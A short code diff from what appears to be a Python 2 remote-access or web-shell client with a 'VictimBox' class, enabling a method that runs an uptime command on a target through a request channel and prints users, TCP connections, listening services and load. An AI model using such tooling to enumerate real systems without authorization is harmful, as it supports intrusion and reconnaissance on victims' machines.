@@ -134,21 +134,21 @@ class VictimBox(object):
         print '\n[+] Successfully uploaded {0} to {1}'.format(lfile_path, rfile_path)
 
     # displays the target's "health" (CPU, Memory usage etc)
-    #def enum_health(self):
-    #    make_request.cmd = "uptime | awk '{print $3 \":\" $5}' | tr -d \",\" | awk -F \":\" '{print $1 \" days, \" $2 \" hours and \" $3 \" minutes\" }'"
-    #    uptime = make_request.get_page_source()[0]
-    #    print '\n{0}[+] Uptime: {1} {2}'.format(Colors.GREEN, uptime, Colors.END)
+    def enum_health(self):
+        make_request.cmd = "uptime | awk '{print $3 \":\" $5}' | tr -d \",\" | awk -F \":\" '{print $1 \" days, \" $2 \" hours and \" $3 \" minutes\" }'"
+        uptime = make_request.get_page_source()[0]
+        print '\n{0}[+] Uptime: {1} {2}'.format(Colors.GREEN, uptime, Colors.END)
 
-    #    print '{0}[+] Idletime: {1} {2}'.format(Colors.GREEN, self.idletime, Colors.END)
-    #    print '{0}[+] Users Logged in: {1} {2}'.format(Colors.GREEN, self.usersloggedin, Colors.END)
-    #    print '{0}[+] Total Users: {1} {2}'.format(Colors.GREEN, self.totalusers, Colors.END)
-    #    print '{0}[+] Total Groups: {1} {2}'.format(Colors.GREEN, self.totalgroup, Colors.END)
-    #    print '{0}[+] CPU Load (1, 5, 15 mins): {1} {2}'.format(Colors.GREEN, self.cpuload, Colors.END)
-    #    print '{0}[+] Memory Load (Used %): {1} {2}'.format(Colors.GREEN, self.memload, Colors.END)
-    #    print '{0}[+] Established TCP Connections: {1} {2}'.format(Colors.GREEN, self.estabtcp, Colors.END)
-    #    print '{0}[+] Listening TCP Services: {1} {2}'.format(Colors.GREEN, self.listtcp, Colors.END)
-    #    print '{0}[+] User Processors: {1} {2}'.format(Colors.GREEN, self.userproc, Colors.END)
-    #    print '{0}[+] Total Processor: {1} {2}'.format(Colors.GREEN, self.totalproc, Colors.END)
+        print '{0}[+] Idletime: {1} {2}'.format(Colors.GREEN, self.idletime, Colors.END)
+        print '{0}[+] Users Logged in: {1} {2}'.format(Colors.GREEN, self.usersloggedin, Colors.END)
+        print '{0}[+] Total Users: {1} {2}'.format(Colors.GREEN, self.totalusers, Colors.END)
+        print '{0}[+] Total Groups: {1} {2}'.format(Colors.GREEN, self.totalgroup, Colors.END)
+        print '{0}[+] CPU Load (1, 5, 15 mins): {1} {2}'.format(Colors.GREEN, self.cpuload, Colors.END)
+        print '{0}[+] Memory Load (Used %): {1} {2}'.format(Colors.GREEN, self.memload, Colors.END)
+        print '{0}[+] Established TCP Connections: {1} {2}'.format(Colors.GREEN, self.estabtcp, Colors.END)
+        print '{0}[+] Listening TCP Services: {1} {2}'.format(Colors.GREEN, self.listtcp, Colors.END)
+        print '{0}[+] User Processors: {1} {2}'.format(Colors.GREEN, self.userproc, Colors.END)
+        print '{0}[+] Total Processor: {1} {2}'.format(Colors.GREEN, self.totalproc, Colors.END)
 
 # taking an instance from VictimBox class
 victim_box = VictimBox()
